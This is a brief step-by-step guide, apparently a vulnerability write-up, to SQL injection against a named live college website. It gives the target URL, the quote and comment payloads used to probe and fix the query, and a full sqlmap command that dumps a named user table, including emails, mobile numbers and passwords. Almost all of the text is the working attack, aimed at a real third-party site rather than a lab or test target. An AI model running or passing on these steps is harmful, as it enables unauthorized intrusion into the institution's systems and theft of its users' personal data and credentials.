By using SQL we will perform sql injection by using following steps:

Steps to preform attack: 


Step1: open the link in the browser 
https://hmmcollege.ac.in/old_site/index.php/Frontend/about_dept?id=1 
Step2: we have to find input parameter  
\     ‘     “     “)     ‘) 
Step3: then we have to fix the query 
‘ --+    
“ --+   “) --+  ‘)  --+ 
Step4: then we have to perform the attack 
sqlmap -u "https://hmmcollege.ac.in/old_site/index.php/Frontend/about_dept?id=1*" --batch -
banner --risk=3 --level=3 -D hmmcolle_demo_db -T king_user -C  
name,status,dept_id,email,moblie,password,updated_on,user_id,user_type_id –dump

Here is the report of those website which is vulnerable for sql injection
